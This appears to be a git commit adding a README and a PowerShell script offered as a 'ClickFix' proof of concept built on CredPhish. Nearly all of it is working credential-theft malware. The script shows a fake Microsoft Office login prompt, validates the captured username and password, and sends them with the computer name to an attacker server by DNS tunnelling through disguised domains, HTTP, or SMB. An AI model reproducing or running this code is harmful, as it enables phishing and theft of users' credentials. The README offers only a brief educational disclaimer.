17d39cf70684484957311fe6bc9c1c5cc8cc168e
b3at1 <sambederman@gmail.com>
2025-10-30 12:46:05 -0500

    add readme and ps1

---
+++ README.md
@@ -0,0 +1,6 @@
+# ClickFix PoC using CredPhish
+
+PoC for classic clickfix attack, using (Credphish)[https://github.com/tokyoneon/CredPhish/tree/master] and [click-to-compromise](https://github.com/amtzespinosa/click-to-compromise/tree/main/website)
+
+### Disclaimer
+This PoC is for educational and research purposes only. Use it at your own risk. The author is not responsible for any misuse or damage caused."
---
+++ credphish.ps1
@@ -0,0 +1,110 @@
+# exfil address
+$exfilServer = "192.168.56.104"
+
+# prompt
+$targetUser = $env:username
+$companyEmail = "allports.tours"
+$promptCaption = "Microsoft Office"
+$promptMessage = "Verifying user: $targetUser@$companyEmail"
+$maxTries = 1 # maximum number of times to invoke prompt
+$delayPrompts = 2 # seconds between prompts
+$validateCredentials = $true # interrupt $maxTries and immediately exfil if credentials are valid
+
+# dns
+# start dns server in kali: python3 /path/to/credphish/dns_server.py
+$enableDnsExfil = $true
+$exfilDomains = @('.microsoft.com', '.google.com', '.office.com', '.live.com') # domains for dns exfil
+$randomDelay = get-random -minimum 1 -maximum 10 # delay between dns queries
+$subdomainLength = 6 # maximum chars in subdomain. must be an even number between 2-60 or queries may break
+
+##########################################################################
+
+$exfilCount = 0
+function invokeDnsExfil(){
+    $subdomain = ""
+    function invokeDnsResolve(){
+        $hex = @()
+        for($j=0;$j -lt $subdomain.length;$j++){
+            $b = "{0:X}" -f ([int]$subdomain[$j])
+            $hex = $hex + $b
+            }
+        $randomDomain = get-random -maximum ($exfilDomains.count)
+        $exfil = ($hex -join '') + $exfilDomains[($randomDomain)]
+        resolve-dnsname $exfil.ToLower() -Type A -Server $exfilServer | out-null
+        start-sleep -Seconds $randomDelay
+    }
+    foreach ($c in 0..$capturedCreds.Length){
+        $subdomain += $capturedCreds[$c]
+        if (($subdomain.Length * 2) -ge $subdomainLength){
+            invokeDnsResolve
+            $subdomain = ""
+            $exfilCount = 0
+        }else{
+            $exfilCount++
+        }
+    }
+    if ($subdomain) {
+        invokeDnsResolve
+    }
+}
+
+function invokeHttpExfil(){
+    $httpServer = 'http://' + $exfilServer + ':' + $httpPort + '/' + [uri]::EscapeDataString($capturedCreds)
+    if (test-path -path $ConfigSecurityPolicy) {
+        & $ConfigSecurityPolicy $httpServer
+    }else{
+        # HTTP method w/ Invoke-WebRequest (lame)
+        Invoke-WebRequest -UseBasicParsing $httpServer | Out-Null
+    }
+}
+
+function invokeSmbExfil(){
+    $capturedCreds | Out-File -Encoding utf8 \\$exfilServer\$shareName\$outputFile
+}
+
+function testCredentials(){
+    $securePassword = ConvertTo-SecureString -AsPlainText $phish.CredentialPassword -Force
+    $secureCredentials = New-Object System.Management.Automation.PSCredential($phish.CredentialUsername, $securePassword)
+    Start-Process ipconfig -Credential $secureCredentials
+    return $?
+}
+
+Add-Type -AssemblyName System.Runtime.WindowsRuntime
+$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | `
+? { $_.Name -eq 'AsTask' -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
+[void][Windows.Security.Credentials.UI.CredentialPicker, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
+$asTask = $asTask.MakeGenericMethod(([Windows.Security.Credentials.UI.CredentialPickerResults]))
+$opt = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
+$opt.AuthenticationProtocol = 0
+$opt.Caption = $promptCaption
+$opt.Message = $promptMessage
+$opt.TargetName = '1'
+
+$count = 0
+$ErrorActionPreference = 'SilentlyContinue'
+[system.collections.arraylist]$harvestCredentials = @()
+while (!($validPassword -Or $count -eq $maxTries)){
+    start-sleep -s $delayPrompts
+    $phish = $asTask.Invoke($null, @(([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($opt)))).Result
+    [void]$harvestCredentials.Add($phish.CredentialUsername + ':' + $phish.CredentialPassword)
+    if (!($phish.CredentialPassword) -Or !($phish.CredentialUsername)){
+        Continue
+    }
+    if ($validateCredentials){
+        $validPassword = testCredentials
+    }
+    $count++
+}
+
+$capturedCreds = $env:computername + '[' + ($harvestCredentials -join ',') + ']'
+if ($enableDnsExfil){
+    invokeDnsExfil
+}
+
+if ($enableHttpExfil){
+    invokeHttpExfil
+}
+
+if ($enableSmbExfil){
+    invokeSmbExfil
+}
